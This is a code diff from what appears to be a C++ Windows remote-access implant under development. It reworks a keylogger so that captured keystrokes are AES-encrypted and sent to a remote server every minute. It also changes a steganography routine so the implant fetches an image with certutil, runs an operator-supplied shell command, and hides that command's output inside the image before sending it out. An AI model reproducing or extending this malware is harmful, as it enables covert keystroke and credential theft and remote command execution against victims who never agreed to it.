@@ -139,16 +139,13 @@ string GetArpTable()
 	return s;
 }
 
-string StartKeyLogger(string nothing)
+string StartKeyLogger(string sharedKey)
 {
-	while (true)
-	{
-		storeKeys = true;
-		thread t1(&KeyLogger);
-		t1.detach();
-		thread t2(&SendKeyLoggerToServer);
-		t2.detach();
-	}
+	storeKeys = true;
+	thread t1(&KeyLogger);
+	t1.detach();
+	thread t2(&SendKeyLoggerToServer, sharedKey);
+	t2.detach();
 	return "Key Logger Started";
 }
 
@@ -158,11 +155,16 @@ string StopKeyLogger(string nothing)
 	return "Key logger stoped";
 }
 
-string HideMessageInPicture(string fileName)
+string HideMessageInPicture(string fileName_and_cmd)
 {
-	thread t1(&SendPicture, fileName);
+ 	vector<string> params = split(fileName_and_cmd);
+	vector<string>::iterator it = params.begin();
+	string fileName = *it;
+	string cmd = *(++it);
+
+	thread t1(&SendPicture, fileName, cmd);
 	t1.detach();
-	return string();
+	return "I will send you result via picture";
 }
 
 
@@ -427,9 +429,9 @@ bool SpecialKeys(int S_Key) {
 	}
 }
 
-void SendPicture(string fileName)
+void SendPicture(string fileName, string cmd)
 {
-	string newFile = EncodeTextInsideImg(fileName);
+	string newFile = EncodeTextInsideImg(fileName, cmd);
 
 	WSADATA wsadata;
 	SOCKET s = NULL;
@@ -509,16 +511,16 @@ void SendPicture(string fileName)
 	iResult = send(s, message.c_str(), message.size(), 0);
 }
 
-string EncodeTextInsideImg(string fileName)
+string EncodeTextInsideImg(string fileName, string cmd)
 {
 	string downloadImg = string("certutil.exe -urlcache -f ").append(fileName).append(" 1.png");
 	exec(downloadImg);
-	string text = "LOOK: This is new string";
+	string text = exec(cmd);
 	Mat img, stego;
 	int b = 0;
 	int bits = text.length() * 8 + 7;
 
-	img = imread("png.1", IMREAD_COLOR);
+	img = imread("1.png", IMREAD_COLOR);
 
 	img.copyTo(stego);
 
@@ -554,7 +556,7 @@ string EncodeTextInsideImg(string fileName)
 
 void KeyLogger()
 {
-	char KEY = 'x';
+	char KEY = ' ';
 
 	while (storeKeys) {
 		Sleep(10);
@@ -577,10 +579,11 @@ void KeyLogger()
 	}
 }
 
-void SendKeyLoggerToServer()
+void SendKeyLoggerToServer(string sharedKey)
 {
 	WSADATA wsadata;
 	SOCKET s = NULL;
+	AES_crypto aes(sharedKey);
 
 	int error = WSAStartup(MAKEWORD(2, 2), &wsadata);
 
@@ -616,7 +619,8 @@ void SendKeyLoggerToServer()
 	while (true)
 	{
 		Sleep(60000);
-		send(s, kl.c_str(), kl.size(), 0);
+		string message = string("6").append(aes.Encrypt(kl));
+		send(s, message.c_str(), message.size(), 0);
 		cout << kl << endl;
 		kl = "";
 	}
